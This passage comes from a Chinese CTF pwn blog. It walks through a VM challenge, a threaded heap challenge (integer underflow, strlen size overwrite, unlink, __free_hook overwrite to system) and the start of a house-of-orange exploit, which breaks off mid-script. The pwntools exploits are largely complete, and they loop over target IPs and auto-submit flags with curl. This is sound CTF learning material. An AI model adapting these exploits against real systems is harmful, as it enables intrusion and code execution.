mem[r6],r1</span></span><br><span class="line">code += p8(<span class="number">0x1</span>) + p8(<span class="number">0x4b</span>)+ p8(<span class="number">5</span>) + p8(<span class="number">2</span>)<span class="comment">#mov mem[r5],r2</span></span><br><span class="line"><span class="comment"># next:</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">4</span>) + p16(<span class="number">1</span>)<span class="comment">#add r4,1</span></span><br><span class="line">code += p8(<span class="number">0x13</span>) + p8(<span class="number">0x47</span>)+ p64(-<span class="number">0x3f</span>+<span class="number">0x10000000000000000</span>)<span class="comment">#jmp loop2</span></span><br><span class="line"><span class="comment"># update:</span></span><br><span class="line">code += p8(<span class="number">0x2</span>) + p8(<span class="number">0x25</span>)+ p8(<span class="number">3</span>) + p16(<span class="number">1</span>)<span class="comment">#add r3,1</span></span><br><span class="line">code += p8(<span class="number">0x13</span>) + p8(<span class="number">0x47</span>)+ p64(-<span class="number">0x6c</span>+<span class="number">0x10000000000000000</span>)<span class="comment">#jmp loop1</span></span><br><span class="line"><span class="comment"># exit:</span></span><br><span class="line">code += p8(<span class="number">0x20</span>) + <span class="string">&quot;AAAAAAAAA&quot;</span></span><br><span class="line">p.send(code)</span><br><span class="line">p.recvuntil(<span class="string">&quot;WINNER!\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line"><span class="comment"># p.recvuntil(&quot;ftp&gt;&quot;)</span></span><br><span class="line"><span class="comment"># p.sendline(&quot;type flag.txt&quot;)</span></span><br><span class="line"><span class="comment"># p.recv(timeout=0.5)</span></span><br><span class="line">flag = p.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token7024a591c07&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>VM_pwn一定要耐心！！！一边写，一边调。</p><h4 id="0x04-thrd"><a href="#0x04-thrd" class="headerlink" title="0x04 thrd"></a>0x04 thrd</h4><p>最后一题终于是heap题了，但牵扯到线程的条件竞争问题，使得调试起来会很奇怪。</p><p>漏洞存在于edit函数中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">edit</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">unsigned</span> <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// er12</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( heaplist[a1] )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = sizelist[a1] - <span class="number">4LL</span>; 当size为<span class="number">0</span>时，v3=<span class="number">-4</span>(<span class="type">unsigned</span> <span class="type">int</span>)，造成堆溢出</span><br><span class="line">      <span class="keyword">if</span> ( a2 &lt;= v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = a3;</span><br><span class="line">        pthread_mutex_lock(&amp;mutex);</span><br><span class="line">        *(_DWORD *)(heaplist[a1] + a2) = v4;</span><br><span class="line">        LODWORD(v3) = pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>还有一个洞是在enc中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">enc</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 idx; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v3; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> content_len; <span class="comment">// er12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  _DWORD *v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 &lt;= <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    idx = a1;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> *)heaplist[a1];</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      content_len = <span class="built_in">strlen</span>(v3);</span><br><span class="line">      pthread_mutex_lock(&amp;mutex);</span><br><span class="line">      v5 = content_len &gt;&gt; <span class="number">2</span>;</span><br><span class="line">      <span class="keyword">if</span> ( (content_len &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        ++v5;</span><br><span class="line">        v6 = (_DWORD *)heaplist[idx];</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v6 = (_DWORD *)heaplist[idx];</span><br><span class="line">        <span class="keyword">if</span> ( !v5 )</span><br><span class="line">        &#123;</span><br><span class="line">LABEL_7:</span><br><span class="line">          pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">          <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      v7 = (__int64)&amp;v6[v5];</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        *v6 ^= a2;</span><br><span class="line">        ++v6;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( v6 != (_DWORD *)v7 );</span><br><span class="line">      <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个的逻辑主要是进行了异或的操作，但漏洞是strlen()函数，当填满堆后strlen会拿到下一个heap的size为，从而我们可以修改下一个heap的size。</p><p>程序一开始给出了elf基地址，PIE白开了，还能控制next heap’s size，因此可以unlink，但中间show泄露的时候，由于线程竞争问题，需要对heap进行修复，当时是抄流量才知道的，很迷。。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">1</span>) + p32(idx) + p32(sz)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">3</span>) + p32(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">4</span>) + p32(idx)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor_</span>(<span class="params">idx,value</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">6</span>) + p32(idx) + p32(value)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,offset,value</span>):</span><br><span class="line"><span class="keyword">return</span> p32(<span class="number">2</span>) + p32(idx)+p32(offset) + p32(value)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">host,port=<span class="number">17066</span></span>):</span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"><span class="keyword">if</span> host:</span><br><span class="line">p = remote(host,port,timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = process(<span class="string">&quot;./pwn_bak.bak.bak&quot;</span>)</span><br><span class="line"><span class="comment"># debug(0x000000000000107B)</span></span><br><span class="line">libc.address = <span class="number">0</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;mem: &quot;</span>)</span><br><span class="line">elf_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) - <span class="number">0x2021a0</span></span><br><span class="line">backdoor = elf_addr+<span class="number">0x000000000000DB0</span></span><br><span class="line">info(<span class="string">&quot;elf : &quot;</span> + <span class="built_in">hex</span>(elf_addr))</span><br><span class="line">ptr = elf_addr + <span class="number">0x000000000202120</span></span><br><span class="line">action = <span class="string">&#x27;&#x27;</span></span><br><span class="line">action += add(<span class="number">0</span>,<span class="number">0x28</span>) + add(<span class="number">1</span>,<span class="number">0xf0</span>) + add(<span class="number">2</span>,<span class="number">0xf0</span>) + add(<span class="number">3</span>,<span class="number">0xf0</span>) + add(<span class="number">4</span>,<span class="number">0xf0</span>) + add(<span class="number">5</span>,<span class="number">0xf0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x28</span>,<span class="number">4</span>):</span><br><span class="line">action += edit(<span class="number">0</span>,i,u32(<span class="string">&quot;efbead6e&quot;</span>.decode(<span class="string">&#x27;hex&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">action += xor_(<span class="number">0</span>,<span class="number">0x401</span>)</span><br><span class="line"></span><br><span class="line">data = p32(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">data += p32(<span class="number">0xffffffff</span>&amp;(ptr-<span class="number">0x18</span>)) + p32((ptr-<span class="number">0x18</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">data += p32(<span class="number">0xffffffff</span>&amp;(ptr-<span class="number">0x10</span>)) + p32((ptr-<span class="number">0x10</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">data += p32(<span class="number">0x20</span>) + p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">0x28</span>,<span class="number">4</span>):</span><br><span class="line">action += edit(<span class="number">0</span>,i,u32(data[i:i+<span class="number">4</span>]))</span><br><span class="line"></span><br><span class="line">action += dele(<span class="number">1</span>) + add(<span class="number">6</span>,<span class="number">0xf0</span>)</span><br><span class="line">action += edit(<span class="number">6</span>,<span class="number">0x10</span>,<span class="number">0x30</span>) + edit(<span class="number">6</span>,<span class="number">0x18</span>,<span class="number">0x11</span>)</span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x18</span>,<span class="number">0xffffffff</span>&amp;ptr) + edit(<span class="number">0</span>,<span class="number">0x1c</span>,ptr&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x8</span>,<span class="number">0xffffffff</span>&amp;(elf_addr+<span class="number">0x201F50</span>)) + edit(<span class="number">0</span>,<span class="number">0xc</span>,(elf_addr+<span class="number">0x201F50</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(action)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">action = <span class="string">&#x27;&#x27;</span></span><br><span class="line">action += edit(<span class="number">0</span>,<span class="number">0x10</span>,<span class="number">0xffffffff</span>&amp;(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">8</span>)) + edit(<span class="number">0</span>,<span class="number">0x14</span>,(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">8</span>)&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += edit(<span class="number">2</span>,<span class="number">0</span>,u32(<span class="string">&quot;/bin&quot;</span>)) + edit(<span class="number">2</span>,<span class="number">0x4</span>,u32(<span class="string">&quot;/sh\x00&quot;</span>))</span><br><span class="line">action += edit(<span class="number">2</span>,<span class="number">8</span>,<span class="number">0xffffffff</span>&amp;(libc.symbols[<span class="string">&quot;system&quot;</span>])) + edit(<span class="number">2</span>,<span class="number">0xc</span>,(libc.symbols[<span class="string">&quot;system&quot;</span>])&gt;&gt;<span class="number">32</span>)</span><br><span class="line">action += dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(action)</span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;;echo hack_by_qwruan &amp;&amp; cat flag&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;qwruan\n&quot;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">p.recvuntil(<span class="string">&quot;flag&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">flag = <span class="string">&quot;flag&quot;</span> + p.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">info(flag)</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> flag</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line">p.close()</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;bad_luck&quot;</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;,checksec=False)</span></span><br><span class="line"><span class="comment"># elf = ELF(&quot;./pwn&quot;,checksec=False)</span></span><br><span class="line">ips = [i.strip() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">open</span>(<span class="string">&quot;ip.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).readlines()]</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">flag = main(ip)</span><br><span class="line"><span class="comment"># flag = main(args[&quot;REMOTE&quot;])</span></span><br><span class="line">info(flag)</span><br><span class="line">url = <span class="string">&#x27;https://172.20.1.1/Answerapi/sub_answer_api&#x27;</span></span><br><span class="line">token = <span class="string">&#x27;token9013e05455d&#x27;</span></span><br><span class="line">cmds = <span class="string">&#x27;curl -k &#123;&#125; -d &quot;answer=&#123;&#125;&amp;playertoken=&#123;&#125;&quot;&#x27;</span>.<span class="built_in">format</span>(url,flag.strip(),token)</span><br><span class="line"><span class="built_in">print</span> cmds</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> cmds:</span><br><span class="line">os.system(cmds)</span><br><span class="line"><span class="keyword">except</span> Exception,err:</span><br><span class="line">p.close()</span><br><span class="line"><span class="built_in">print</span> err</span><br><span class="line"><span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>ruan师傅nb，我还是太年轻了。还有很长的路要走:D</p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Geekpwn</title>
      <link href="/2020/07/18/Geekpwn/"/>
      <url>/2020/07/18/Geekpwn/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01paperpointer"><a href="#0x01paperpointer" class="headerlink" title="0x01paperpointer"></a>0x01paperpointer</h3><p>先介绍下本题的利用手法:house of orange</p><span id="more"></span><p>前提：需要有较大范围内的堆溢出,并泄露libc基址。</p><p>1、删除一个堆块至unsorted bin，并修改该chunk的bk为_IO_list_all-0x10。</p><p>参考源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks(av)-&gt;bk) != unsorted_chunks(av)) &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            [...]</span><br><span class="line">            <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">            unsorted_chunks(av)-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = unsorted_chunks(av);</span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                   chunk2mem (victim), av);<span class="comment">//攻击开始函数</span></span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>可以看到当remove from unsorted list时，bck&#x3D;_IO_list_all-0x10，unsorted_chunks(av)&#x3D;main_arean+88</p><p>因此赋值是会发生：</p><p>main_arean+88+0x18&#x3D;_IO_list_all-0x10</p><p>_IO_list_all-0x10+0x10&#x3D;main_arean+88</p><p>说明：进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护，其一般指向IO_2_1_stderr</p><p>所以等到函数调用时，就会从 _IO_2_1_stderr*改变去 arena 里。</p><p>2、修改该unsorted bin的pre+size为’&#x2F;bin&#x2F;sh’,size为0x61。</p><p>参考源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* place chunk in bin */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(size)) &#123;</span><br><span class="line">        victim_index = smallbin_index(size);</span><br><span class="line">        bck = bin_at(av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    [...]</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure><p>由于我们伪造的size为0x61，所以会进入small bin，可以看到此时的赋值操作为：</p><p>fwd-&gt;bk&#x3D;victim</p><p>即：main_arean+88+0x60+0x18&#x3D;victim(chunk地址)</p><p>而在IO_file的结构体中,offset为0x78处正好为<code>_chain </code>指针,所以若是在 arena 里的file流要跳转，就会跳转到原chunk里</p><p>说明：<code>struct _IO_FILE _chain;/指向下一个file结构/</code></p><p>3、伪造file里的数据绕过检查。</p><p>_mode &lt;&#x3D; 0<br>_IO_write_ptr &gt;_IO_write_base<br>或<br>_IO_vtable_offset (fp) &#x3D;&#x3D; 0（无法变动）<br>_mode &gt; 0<br>_wide_data-&gt;_IO_write_ptr &gt; wide_data-&gt;_IO_write_base</p><p><img src="https://p4.ssl.qhimg.com/t01b54b51a896518067.png" alt="img"></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">&quot;183.60.136.230&quot;</span>,<span class="number">16145</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">offset,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">offset</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(offset))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">sleep=<span class="built_in">int</span>(p.recv(<span class="number">3</span>),<span class="number">16</span>)</span><br><span class="line">byte=(sleep&lt;&lt;<span class="number">8</span>)+<span class="number">0xa00000</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(byte)</span><br><span class="line">edit(<span class="number">0x400</span>,<span class="number">0x200</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x141</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x60</span>+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x130</span>-<span class="number">0x60</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x100</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+<span class="string">&#x27;\x00&#x27;</span>*<span 